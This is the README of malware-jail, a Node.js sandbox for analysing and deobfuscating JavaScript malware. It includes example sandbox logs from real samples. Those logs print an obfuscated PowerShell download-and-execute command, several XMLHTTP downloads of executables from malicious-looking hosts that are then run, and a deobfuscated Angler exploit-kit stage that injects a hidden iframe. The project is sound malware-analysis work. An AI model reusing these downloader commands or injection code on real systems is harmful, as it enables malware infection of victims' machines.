# malware-jail
Sandbox for semi-automatic Javascript malware analysis, deobfuscation and payload extraction. Written for Node.js

malware-jail is written for [Node's 'vm' sandbox](https://nodejs.org/api/vm.html). Currently implements 
WScript (Windows Scripting Host) context [env/wscript.js](https://github.com/HynekPetrak/malware-jail/blob/master/env/wscript.js), at least the part frequently used
by malware. Internet browser context is partialy implemented [env/browser.js](https://github.com/HynekPetrak/malware-jail/blob/master/env/browser.js).

Runs on any operating system. Developed and tested on Linux, Node.js v6.6.0.

Due to use of some ES6 features, you'll need Node.js >= 6.x.

> See [EXAMPLES](EXAMPLES.md) for malware samples analyzed.

> Malware samples welcome via pull requests

## Installing ##

You'll need [Node.js](https://nodejs.org) and [npm](https://npmjs.org/) installed.

malware-jail is built on top of [minimist](https://www.npmjs.com/package/minimist), [iconv-lite](https://github.com/ashtuchkin/iconv-lite) 
and [entities](https://www.npmjs.com/package/entities).

### Pull from GitHub ###

Pull the source with git:

    git clone https://github.com/HynekPetrak/malware-jail.git
    cd malware-jail

Then install all the dependecies (minimist, entities, iconv-lite) with:

    npm install

### NPM Package ###

Not yet available, comming soon ...

## Warning ##

> Be careful when working with a real malware. A malware, which is aware of this sandbox, may try to escape and harm your PC. 
> It's recommended you run it either from an unpriviledged Linux account or from within virtualized Windows machine.
> Angler files in the malware folder are NOT disarmed.

## Usage ##

    bash@linux# node jailme.js -h -b list
    1 Oct 13:09:37 - mailware-jail, a malware sandbox ver. 0.8
    1 Oct 13:09:37 - ------------------------
    1 Oct 13:09:37 - Usage: node jailme.js  [[-e file1] [-e file2] .. ] [-c ./config.json] \
    1 Oct 13:09:37 -                [-o ofile] [-b id] \
    1 Oct 13:09:37 -                [-s odir] [--down=y] [malware1 [malware2] .. ]
    1 Oct 13:09:37 -        -c config .. use alternative config file, preceed with ./
    1 Oct 13:09:37 -        -e ifile ... js that simulates specific environment
    1 Oct 13:09:37 -        -o ofile ... name of the file where sandbox shall be dumped at the end
    1 Oct 13:09:37 -        -s odir  ... output directory for generated files (malware payload)
    1 Oct 13:09:37 -        -b id    ... browser type, use -b list for possible values
    1 Oct 13:09:37 -        --down=y ... use http request to download malware components automatically
    1 Oct 13:09:37 -        malware  ... js with the malware code
    1 Oct 13:09:37 - If no arguments are specified the default values are taken from config.json
    1 Oct 13:09:37 - Possible -b values: [ 'IE11_W10', 'IE8', 'IE7', 'iPhone', 'Firefox', 'Chrome' ]



In the examples folder you may find a deactivated malware file. Run the analysis with:

    node jailme.js -c ./config_wscript_only.json --down=y malware/example.js

Internet browser based malware you may test with

    node jailme.js -b IE11_W10 malware/example_browser.js

At the end of the analysis the complete sandbox context is dumped into a _'sandbox\_dump\_after.json'_ file.

You may want to examine following entries of _'sandbox\_dump\_after.json'_:

* _eval\_calls_ - array of all eval() calls arguments. Useful if eval() is used for deobfucation.
* _wscript\_saved\_files_ - content of all files that the malware attempted to drop. The actual files are saved into the output/ directory too.
* _wscript\_urls_ - all URLs that the malware intended to GET or POST.
* _wscript\_objects_ - WScript or ActiveX objects created.

_'sandbox\_dump\_after.json'_ uses [JSONPath](http://goessner.net/articles/JsonPath/), implemented by [JSON-js/cycle.js](https://github.com/douglascrockford/JSON-js), to save duplicated or cyclic references to a same object.

## Sample output ##


    bash@linux# node jailme.js malware/example.js
    11 Jan 00:06:24 - Malware sandbox ver. 0.2
    11 Jan 00:06:24 - ------------------------
    11 Jan 00:06:24 - Sandbox environment sequence: env/eval.js,env/wscript.js
    11 Jan 00:06:24 - Malware files: malware/example.js
    11 Jan 00:06:24 - Output file for sandbox dump: sandbox_dump_after.json
    11 Jan 00:06:24 - Output directory for generated files: output/
    11 Jan 00:06:24 - ==> Preparing Sandbox environment.
    11 Jan 00:06:24 -  => Executing: env/eval.js
    11 Jan 00:06:24 - Preparing sandbox to intercept eval() calls.
    11 Jan 00:06:24 -  => Executing: env/wscript.js
    11 Jan 00:06:24 - Preparing sandbox to emulate WScript environment.
    11 Jan 00:06:24 - ==> Executing malware file(s).
    11 Jan 00:06:24 -  => Executing: malware/example.js
    11 Jan 00:06:24 - ActiveXObject(WScript.Shell)
    11 Jan 00:06:24 - Created: WScript.Shell[1]
    11 Jan 00:06:24 - WScript.Shell[1].ExpandEnvironmentStrings(%TEMP%)
    11 Jan 00:06:24 - ActiveXObject(MSXML2.XMLHTTP)
    11 Jan 00:06:24 - Created: MSXML2.XMLHTTP[2]
    11 Jan 00:06:24 - MSXML2.XMLHTTP[2].open(POST,http://EXAMPLE.COM/redir.php,false)
    11 Jan 00:06:24 - MSXML2.XMLHTTP[2].setRequestHeader(Content-Type, application/x-www-form-urlencoded)
    11 Jan 00:06:24 - MSXML2.XMLHTTP[2].send(iTlOlnxhMXnM=0.588860877091065&jndj=IT0601)
    11 Jan 00:06:24 - MSXML2.XMLHTTP[2] Not sending data, if you want to interract with remote server, set --down=y
    11 Jan 00:06:24 - MSXML2.XMLHTTP[2] Calling onreadystatechange() with dummy data
    11 Jan 00:06:24 - ActiveXObject(ADODB.Stream)
    11 Jan 00:06:24 - Created: ADODB_Stream[3]
    11 Jan 00:06:24 - ADODB_Stream[3].Open()
    11 Jan 00:06:24 - ADODB_Stream[3].Write(str) - 10001 bytes
    11 Jan 00:06:24 - ADODB_Stream[3].SaveToFile(%TEMP%\57020551.dll, 2)
    11 Jan 00:06:24 - WScript.Shell[1].Exec(rundll32 %TEMP%\57020551.dll, DllRegisterServer)
    11 Jan 00:06:24 - ADODB_Stream[3].Close()
    11 Jan 00:08:42 - ==> Script execution finished, dumping sandbox environment to a file.
    11 Jan 00:08:42 - Saving: output/_TEMP__49629482.dll
    11 Jan 00:08:42 - Saving: output/_TEMP__38611354.pdf
    11 Jan 00:08:42 - Generated file saved
    11 Jan 00:08:42 - Generated file saved
    11 Jan 00:08:42 - The sandbox context has been  saved to: sandbox_dump_after.json

In the above example the payload has been extracted into output/_TEMP__49629482.dll and output/_TEMP__38611354.pdf

## Examples ##

The [malware](malware) folder contains real-world malware samples. Most of them downloaded from https://malwr.com. 

Please see [EXAMPLES](EXAMPLES.md) for complete index of malware samples.

### Example: Analysing Wileen.js ###

Taking malicious script from malwr.com: [Wileen.js](https://malwr.com/analysis/NTVkZDQ4MGZkZWE4NDAyM2EwODEyMDM3MDhjMDI1MTQ/)

Apparently the malware does not execute if run from within a browser:

	if (typeof document == "undefined") {

Therefore you may want to use an alternate config filem which does not load browser/DOM components:

    node jailme.js --down=y -c ./config_wscript_only.json  malware/20161001/a6dfd6b83d46702c0b408bd5f669e08c785cd12fdd515fe469595e2a3d44ddc4.js 

Interesting use of Powershell:
    
    1 Oct 13:05:34 -  => Executing: malware/20161001/a6dfd6b83d46702c0b408bd5f669e08c785cd12fdd515fe469595e2a3d44ddc4.js
    1 Oct 13:05:34 - ActiveXObject(WScRipT.SHEll)
    1 Oct 13:05:34 - Created: WScript.Shell[1]
    1 Oct 13:05:34 - WScript.Shell[1].Run(cmD.EXE /c POWE^R^s^he^lL.eXE     -ExEc^U^Tio^n^p^oLIC^y^   B^Y^pas^S -NOpro^Fi^L^e^    -^W^InD^Ow^sT^yle^  HI^ddeN^  (^Ne^W^-^OBJ^ecT^     S^YST^EM.net.Webc^L^I^E^n^T^).^dOWn^L^Oa^d^fI^lE^(^'http://click.doubledating.ru/js/boxun4.bin','%appdatA%.exE')^;^stA^Rt-^p^rO^c^eS^s  ^'%aPpdata%.eXe', false, undefined)
    1 Oct 13:05:34 - ==> Cleaning up sandbox.
    1 Oct 13:05:34 - ==> Script execution finished, dumping sandbox environment to a file.
    1 Oct 13:05:34 - The sandbox context has been  saved to: sandbox_dump_after.json
    
Log file: [malware/20161001/a6dfd6b83d46702c0b408bd5f669e08c785cd12fdd515fe469595e2a3d44ddc4.out](malware/20161001/a6dfd6b83d46702c0b408bd5f669e08c785cd12fdd515fe469595e2a3d44ddc4.out)

### Example: Analysing ORDER-10455.js ###

Taking malicious JavaScript from malwr.com: [ORDER-10455.js](https://malwr.com/analysis/NDU1ZDA4NmY3ZGUyNDczZjg0ODU2OGZiZTMxNjA5NzE/)

First run without interaction with remote servers:

    node jailme.js malware/20160929/416e32e1b22ecb8f360ff841b87d77ac9450fda24458ce4e70abb35ff4d242a3.js

you get something like:
    
    ... 
    29 Sep 23:17:21 - Calling eval() no.: 5
    29 Sep 23:17:21 - ActiveXObject(MSXML2.XMLHTTP)
    29 Sep 23:17:21 - Created: MSXML2.XMLHTTP[9]
    29 Sep 23:17:21 - MSXML2.XMLHTTP[9].open(GET,http://caopdjow.top/user.php?f=0.dat,false)
    29 Sep 23:17:21 - MSXML2.XMLHTTP[9].send(undefined)
    29 Sep 23:17:21 - MSXML2.XMLHTTP[9] Not sending data, if you want to interact with remote server, set --down=y
    29 Sep 23:17:21 - MSXML2.XMLHTTP[9].responseBody = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ... (truncated)'
    29 Sep 23:17:21 - MSXML2.XMLHTTP[9].status = '200'
    29 Sep 23:17:21 - MSXML2.XMLHTTP[9].send(undefined) finished
    29 Sep 23:17:21 - MSXML2.XMLHTTP[9].status.get() => 200
    29 Sep 23:17:21 - MSXML2.XMLHTTP[9].ResponseBody.get() => aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ... (truncated)
    29 Sep 23:17:21 - ActiveXObject(Scripting.FileSystemObject)
    29 Sep 23:17:21 - Scripting.FileSystemObject[10] created.
    29 Sep 23:17:21 - Scripting.FileSystemObject[10].GetSpecialFolder(2)
    29 Sep 23:17:21 - ActiveXObject(ADODB.Stream)
    29 Sep 23:17:21 - Created: ADODB_Stream[11]
    29 Sep 23:17:21 - ADODB_Stream[11].Open()
    29 Sep 23:17:21 - ADODB_Stream[11].Type = '1'
    29 Sep 23:17:21 - ADODB_Stream[11].content = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ... (truncated)'
    29 Sep 23:17:21 - ADODB_Stream[11].Write(str) - 10000 bytes
    29 Sep 23:17:21 - ADODB_Stream[11].size = '10000'
    29 Sep 23:17:21 - ADODB_Stream[11].Position = '0'
    29 Sep 23:17:21 - ADODB_Stream[11].SaveToFile(Special_Folder__2\w8z05i7y2.exe, 2)
    29 Sep 23:17:21 - ADODB_Stream[11].content.get() => aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ... (truncated)
    29 Sep 23:17:21 - ADODB_Stream[11].Close()
    29 Sep 23:17:21 - ActiveXObject(WScript.Shell)
    29 Sep 23:17:21 - Created: WScript.Shell[12]
    29 Sep 23:17:21 - WScript.Shell[12].Run(Special_Folder__2\w8z05i7y2.exe, undefined, undefined)
    29 Sep 23:17:21 - Returning: 'undefined'
    29 Sep 23:17:21 - ==> Cleaning up sandbox.
    29 Sep 23:17:21 - ==> Script execution finished, dumping sandbox environment to a file.
    29 Sep 23:17:21 - MSXML2.XMLHTTP[9].ResponseBody.get() => aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ... (truncated)
    29 Sep 23:17:21 - Saving: output/Special_Folder__2_w8z05i7y2.exe
    29 Sep 23:17:21 - Generated file saved
    29 Sep 23:17:21 - The sandbox context has been  saved to: sandbox_dump_after.json

Seems to be a "standard" behaviour of deobfuscation in order to finally download an exe binary and execute it.

If we want to get the real payload, run it with '--down=y':

     node jailme.js --down=y  malware/20160929/416e32e1b22ecb8f360ff841b87d77ac9450fda24458ce4e70abb35ff4d242a3.js > malware/20160929/416e32e1b22ecb8f360ff841b87d77ac9450fda24458ce4e70abb35ff4d242a3.out 
     
Log file: [malware/20160929/416e32e1b22ecb8f360ff841b87d77ac9450fda24458ce4e70abb35ff4d242a3.out](malware/20160929/416e32e1b22ecb8f360ff841b87d77ac9450fda24458ce4e70abb35ff4d242a3.out)

### Example: Analysing Norri.js ###

Taking malicious JavaScript from malwr.com: [Norri.js](https://malwr.com/analysis/Mjc0ZjUyMjZhYzg4NDJlYmEwNzBkMTAxODA5NGYwZGM/)

Run:

    node jailme.js --down=y malware/20160929/cb7fc381f6f7600ca0060764ae117482cae3a0fa02db4467604a55c57d069124.js

you get:

    30 Sep 01:02:11 -  => Executing: malware/20160929/cb7fc381f6f7600ca0060764ae117482cae3a0fa02db4467604a55c57d069124.js
    30 Sep 01:02:11 - Strict mode: false
    30 Sep 01:02:11 - Calling eval() no.: 1
    30 Sep 01:02:11 - WScript.CreateObject(WScript.Shell)
    30 Sep 01:02:11 - Created: WScript.Shell[9]
    30 Sep 01:02:11 - WScript.SpecialFolders(Desktop)
    30 Sep 01:02:11 - WScript.CreateShortcut(Desktop/?eno.lnk)
    30 Sep 01:02:11 - Created: WshShortcut[10](Desktop/?eno.lnk)
    30 Sep 01:02:11 - WshShortcut[10](Desktop/?eno.lnk).FullName.get() => Desktop/?eno.lnk
    30 Sep 01:02:11 - WScript.CreateObject(Scripting.FileSystemObject)
    30 Sep 01:02:11 - Scripting.FileSystemObject[11] created.
    30 Sep 01:02:11 - WScript.CreateObject(WScript.Shell)
    30 Sep 01:02:11 - Created: WScript.Shell[12]
    30 Sep 01:02:11 - WScript.CreateObject(MSXML2.XMLHTTP)
    30 Sep 01:02:11 - Created: MSXML2.XMLHTTP[13]
    30 Sep 01:02:11 - WScript.CreateObject(ADODB.Stream)
    30 Sep 01:02:11 - Created: ADODB_Stream[14]
    30 Sep 01:02:11 - Scripting.FileSystemObject[11].GetSpecialFolder(2) => TemporaryFolder/
    30 Sep 01:02:11 - Scripting.FileSystemObject[11].GetTempName() => TempFile[15]
    30 Sep 01:02:11 - MSXML2.XMLHTTP[13].open(GET,http://girlx.tornadodating.ru/js/boxun4.bin,0)
    30 Sep 01:02:11 - MSXML2.XMLHTTP[13] string true
    30 Sep 01:02:11 - MSXML2.XMLHTTP[13].async = 'false'
    30 Sep 01:02:11 - MSXML2.XMLHTTP[13].async.get() => false
    30 Sep 01:02:11 - MSXML2.XMLHTTP[13].send(undefined)
    30 Sep 01:02:15 - MSXML2.XMLHTTP[13].onreadystatechange(), readyState = 4 length: 196608 status: 200
    30 Sep 01:02:15 - MSXML2.XMLHTTP[13] statusText = null
    30 Sep 01:02:15 - MSXML2.XMLHTTP[13].responseBody = 'MZ?@?!?L?!This program cannot be ... (truncated)'
    30 Sep 01:02:15 - MSXML2.XMLHTTP[13].status = '200'
    30 Sep 01:02:15 - MSXML2.XMLHTTP[13].onreadystatechange() undefined
    30 Sep 01:02:15 - MSXML2.XMLHTTP[13].send(undefined) finished
    30 Sep 01:02:15 - ADODB_Stream[14].type = '1'
    30 Sep 01:02:15 - MSXML2.XMLHTTP[13].ResponseBody.get() => MZ?@?!?L?!This program cannot be ... (truncated)
    30 Sep 01:02:15 - ADODB_Stream[14].Open()
    30 Sep 01:02:15 - ADODB_Stream[14].content = 'MZ?@?!?L?!This program cannot be ... (truncated)'
    30 Sep 01:02:15 - ADODB_Stream[14].Write(str) - 196608 bytes
    30 Sep 01:02:15 - ADODB_Stream[14].size = '196608'
    30 Sep 01:02:15 - ADODB_Stream[14].SaveToFile(TemporaryFolder/TempFile[15], undefined)
    30 Sep 01:02:15 - ADODB_Stream[14].content.get() => MZ?@?!?L?!This program cannot be ... (truncated)
    30 Sep 01:02:15 - ADODB_Stream[14].Close()
    30 Sep 01:02:15 - WScript.Shell[12].Run(cmd.exe /c TemporaryFolder/TempFile[15], 0, undefined)
    30 Sep 01:02:15 - Scripting.FileSystemObject[11].DeleteFile(script_full_name.js)
    30 Sep 01:02:15 - ==> Cleaning up sandbox.
    30 Sep 01:02:15 - ==> Script execution finished, dumping sandbox environment to a file.
    30 Sep 01:02:15 - MSXML2.XMLHTTP[13].ResponseBody.get() => MZ?@?!?L?!This program cannot be ... (truncated)
    30 Sep 01:02:16 - Saving: output/TemporaryFolder_TempFile[15]
    30 Sep 01:02:16 - Generated file saved
    30 Sep 01:02:16 - The sandbox context has been  saved to: sandbox_dump_after.json

Behaviour is obvious from the log. Payload has been extracted into the output/TemporaryFolder_TempFile[15] file. 

Log file: [malware/20160929/cb7fc381f6f7600ca0060764ae117482cae3a0fa02db4467604a55c57d069124.out](malware/20160929/cb7fc381f6f7600ca0060764ae117482cae3a0fa02db4467604a55c57d069124.out)


### Example: Analysing Angler EK ###

Download and extract Angler EK from a pcap file at [ANGLER EK SENDS CRYPTOWALL](http://www.malware-traffic-analysis.net/2015/12/21/index.html) into a [malware/angler/angler_full.html](malware/angler/angler_full.html).

Strip the non Angler part and save as [malware/angler/angler_stripped.html](malware/angler/angler_stripped.html).

Remove `<script>` tags and convert required `<div>` tags into:
    
    document._addElementById(id, content);

and save as [malware/angler/angler.js](malware/angler/angler.js).

Run the analysis:

    node jailme.js malware/angler/angler.js
    
Eventually capture the output into [angler_output.txt](malware/angler/angler_output.txt):

    node jailme.js malware/angler/angler.js > malware/angler/angler_output.txt

Deobfuscating the final stage:

    function() {
        if (document.body != null && typeof document.body != "undefined") {
            clearInterval(zfxhYOGvfrlHUNJrZufQnWPtohkYAQEEdV);
            if (typeof window["v_bcd50d9482665cd4e129a272c76799e6"] == "undefined") {
                window["v_bcd50d9482665cd4e129a272c76799e6"] = 1;
                var YJEsPBctdgLUVvQpXvqYKJmoYsElJUhXr = (DfPJmMLOnxPanSoeHQuOrDdSoCPJGAaRhYURtgyUD() && CCtJDLZQbieboJvsIyatBMZhUvTpzaQcyCXR());
                var YBMlxOjmRXjqriuNuiEQPAJsQuuwPLiQW = !YJEsPBctdgLUVvQpXvqYKJmoYsElJUhXr && !!window.chrome && window.navigator.vendor === "Google Inc.";
                var rfddjrtkllJefuAgPfwCNdpgltcAYetudMCia = -1;
                var NOpYEscCPxFAjNAQevxjqvOuLilysKlWWoayIjJeS = "http://beladonna33.ga/052F";
                if (hgvANEpEuWeKcGvvwzyKQIhEoKIHuYnyaOtvVW() && rfddjrtkllJefuAgPfwCNdpgltcAYetudMCia == 1) {
                    if ((navigator.userAgent.match(/iPhone/i)) || (navigator.userAgent.match(/iPod/i))) {
                        location.replace(NOpYEscCPxFAjNAQevxjqvOuLilysKlWWoayIjJeS)
                    } else {
                        window.location = NOpYEscCPxFAjNAQevxjqvOuLilysKlWWoayIjJeS;
                        document.location = NOpYEscCPxFAjNAQevxjqvOuLilysKlWWoayIjJeS
                    }
                } else {
                    if ((YJEsPBctdgLUVvQpXvqYKJmoYsElJUhXr && !YBMlxOjmRXjqriuNuiEQPAJsQuuwPLiQW && !hgvANEpEuWeKcGvvwzyKQIhEoKIHuYnyaOtvVW())) {
                        var blDiNORLBvDHjFRqgxXSMVgnfhriGmw = "<div style=\"position:absolute;left:-2808px;\"><iframe width=\"27px\" src=\"" + NOpYEscCPxFAjNAQevxjqvOuLilysKlWWoayIjJeS + "\" height=\"27px\"></iframe></div>";
                        var wudhWcxLZqnlyHWLSZexIwyPtiJtGDxL = document.getElementsByTagName("div");
                        if (wudhWcxLZqnlyHWLSZexIwyPtiJtGDxL.length == 0) {
                            document.body.innerHTML = document.body.innerHTML + blDiNORLBvDHjFRqgxXSMVgnfhriGmw
                        } else {
                            var dl_name = wudhWcxLZqnlyHWLSZexIwyPtiJtGDxL.length;
                            var eBYogcDktAguizQshmLzdvYhWtSflHvZqVuqIc = Math.floor((dl_name / 2));
                            wudhWcxLZqnlyHWLSZexIwyPtiJtGDxL[eBYogcDktAguizQshmLzdvYhWtSflHvZqVuqIc].innerHTML = wudhWcxLZqnlyHWLSZexIwyPtiJtGDxL[eBYogcDktAguizQshmLzdvYhWtSflHvZqVuqIc].innerHTML + blDiNORLBvDHjFRqgxXSMVgnfhriGmw
                        }
                    }
                }
            }
            OncYaaSjwrEWhyHWevaHtkypMUSZxnIrtIK()
        }
    }


## License ##

The MIT License (MIT)

Copyright (c) 2016 Hynek Petrak

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
